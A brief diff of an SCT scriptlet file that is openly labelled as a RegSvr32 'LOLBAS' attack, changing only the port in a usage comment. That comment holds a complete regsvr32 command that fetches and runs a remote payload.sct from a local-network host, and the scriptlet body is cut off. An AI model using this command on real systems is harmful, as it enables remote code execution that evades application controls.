@@ -1,6 +1,6 @@
 <?XML version="1.0"?>
 <!-- SCT File for RegSvr32 LOLBAS Attack -->
-<!-- Usage: regsvr32.exe /s /n /u /i:http://192.168.1.21:8080/payload.sct scrobj.dll -->
+<!-- Usage: regsvr32.exe /s /n /u /i:http://192.168.1.21:8000/payload.sct scrobj.dll -->
 <scriptlet>
 
 <registration
